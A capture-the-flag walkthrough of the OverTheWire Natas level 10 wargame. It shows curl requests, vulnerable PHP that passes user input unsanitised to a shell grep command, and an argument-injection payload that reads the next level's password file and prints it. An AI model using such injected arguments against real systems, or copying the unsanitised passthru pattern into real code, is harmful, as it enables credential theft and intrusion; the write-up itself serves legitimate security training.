### natas10 pswd: EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

```bash
curl -v -s -c cookie.txt -X POST http://natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv@natas10.natas.labs.overthewire.org

# * Host natas10.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas10.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 34668 
# * using HTTP/1.x
# * Server auth using Basic with user 'natas10'
# > POST / HTTP/1.1
# > Host: natas10.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXMxMDp0N0k1Vkh2cGExNHNKVFVHVjBjYkVzYllmRlAyZG1PdQ==
# > User-Agent: curl/8.19.0
# > Accept: */*
# > 
# * Request completely sent off
# < HTTP/1.1 200 OK
# < Date: Sun, 21 Jun 2026 16:46:45 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Vary: Accept-Encoding
# < Content-Length: 1095
# < Content-Type: text/html; charset=UTF-8
# < 
# <html>
# <head>
# <body>
# <h1>natas10</h1>
# <div id="content">
# 
# For security reasons, we now filter on certain characters<br/><br/>
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# 
# 
# Output:
# <pre>
# </pre>
# 
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
# * Connection #0 to host natas10.natas.labs.overthewire.org:80 left intact
# 
```

Let's have a look on the source code, to be sure what is filtered out

```bash
curl -s  http://natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv@natas10.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
# <html>
# <head>
# <body>
# <h1>natas10</h1>
# <div id="content">
# 
# For security reasons, we now filter on certain characters<br/><br/>
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=
# Search><br><br>
# </form>
# 
# 
# Output:
# <pre>
# <?
# $key = "";
# 
# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }
# 
# if($key != "") {
#     if(preg_match('/[;|&]/',$key)) {
#         print "Input contains an illegal character!";
#     } else {
#         passthru("grep -i $key dictionary.txt");
#     }
# }
# ?>
# </pre>
# 
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

the php code:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Since the semicolon is filtered out we can't break out from the `grep` command, but if we can't fight it, we'll join it ;-)

the grep syntax:

```bash
grep [search_pattern] [file1] [file2] [file3] ...
```

Since the space character is not filtered, we can type 2 words separated by space in the Search box: `. /etc/natas_webpass/natas11` and the linux terminal will execute the command

```bash
grep -i . /etc/natas_webpass/natas11 dictionary.txt
```
- the `.` pattern matches any character (will display all non-empty lines in the searched file)
- `/etc/natas_webpass/natas11` this will be the *first* file to search
- `dictionary.txt` this is the *second* file to search

```bash
curl -s 'http://natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv@natas10.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search' | head -28
# <html>
# <head>
# <body>
# <h1>natas10</h1>
# <div id="content">
# 
# For security reasons, we now filter on certain characters<br/><br/>
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# 
# 
# Output:
# <pre>
/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
# dictionary.txt:African
# dictionary.txt:Africans
# dictionary.txt:Allah
# ...
```